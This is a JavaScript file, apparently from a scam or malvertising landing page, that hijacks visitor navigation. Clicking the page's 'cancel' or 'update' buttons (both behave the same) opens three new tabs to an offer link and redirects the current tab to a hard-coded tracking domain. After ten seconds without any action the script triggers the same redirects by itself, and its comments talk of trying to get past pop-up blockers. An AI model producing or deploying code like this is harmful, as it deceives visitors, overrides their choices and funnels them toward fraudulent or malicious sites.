// Script for opening URLs on button click and after inactivity
(function() {
    // Configuration - можно изменить в index.html через data-атрибуты
    const DEFAULT_NEW_TABS_COUNT = 3; // Количество новых вкладок по умолчанию
    const DEFAULT_INACTIVITY_SECONDS = 10; // Время бездействия в секундах
    const DEFAULT_REDIRECT_URL = 'https://winnerrrdinnerrrtoday.store/click?lp=1'; // URL для редиректа в текущей вкладке
    
    let actionTriggered = false;
    let timerTimeout = null;
    
    // Get configuration from HTML
    function getConfig() {
        const configElement = document.querySelector('[data-config]') || document.body;
        return {
            newTabsCount: parseInt(configElement.getAttribute('data-new-tabs-count')) || DEFAULT_NEW_TABS_COUNT,
            inactivitySeconds: parseInt(configElement.getAttribute('data-inactivity-seconds')) || DEFAULT_INACTIVITY_SECONDS,
            redirectUrl: configElement.getAttribute('data-redirect-url') || DEFAULT_REDIRECT_URL
        };
    }
    
    // Get offer link from buttons
    function getOfferLink() {
        const buttons = document.querySelectorAll('.cancel_btn, .update_btn');
        if (buttons.length > 0) {
            const firstButton = buttons[0];
            return firstButton.getAttribute('href') || DEFAULT_REDIRECT_URL;
        }
        return DEFAULT_REDIRECT_URL;
    }
    
    // Open URLs function
    function openUrls(isUserAction = false) {
        if (actionTriggered) return; // Предотвращаем повторный вызов
        
        actionTriggered = true;
        const config = getConfig();
        const offerLink = getOfferLink(); // Ссылка из кнопки (href)
        
        // Если это действие пользователя (клик) - открываем вкладки сразу
        if (isUserAction) {
            // Открываем N новых вкладок с URL из КНОПКИ (href кнопки) - СРАЗУ, синхронно
            for (let i = 0; i < config.newTabsCount; i++) {
                window.open(offerLink, '_blank');
            }
            // Затем редиректим текущую вкладку
            setTimeout(() => {
                window.location.href = config.redirectUrl;
            }, 50);
        } else {
            // Для автоматического открытия (бездействие) - пробуем открыть, но может блокироваться
            // Открываем новые вкладки
            for (let i = 0; i < config.newTabsCount; i++) {
                setTimeout(() => {
                    const newWindow = window.open(offerLink, '_blank');
                    // Если браузер заблокировал, пробуем еще раз через небольшую задержку
                    if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
                        // Попытка обойти блокировку не сработает, но попробуем
                        console.warn('Pop-up blocked, trying alternative method');
                    }
                }, i * 200);
            }
            // Редиректим текущую вкладку
            setTimeout(() => {
                window.location.href = config.redirectUrl;
            }, 100);
        }
    }
    
    // Start simple timeout timer
    function startTimeout() {
        const config = getConfig();
        
        // Простой таймер - отсчитывает время с момента загрузки страницы
        timerTimeout = setTimeout(() => {
            if (!document.hidden && !actionTriggered) {
                openUrls();
            }
        }, config.inactivitySeconds * 1000);
    }
    
    // Handle button clicks
    function setupButtonHandlers() {
        const buttons = document.querySelectorAll('.cancel_btn, .update_btn');
        buttons.forEach(button => {
            button.addEventListener('click', function(e) {
                e.preventDefault();
                // Передаем true, чтобы указать что это действие пользователя
                openUrls(true);
            });
        });
    }
    
    // Initialize on page load
    document.addEventListener('DOMContentLoaded', function() {
        // Настраиваем обработчики кнопок
        setupButtonHandlers();
        
        // Запускаем простой таймер
        startTimeout();
    });
    
    // Expose function globally if needed
    window.openUrls = openUrls;
})();
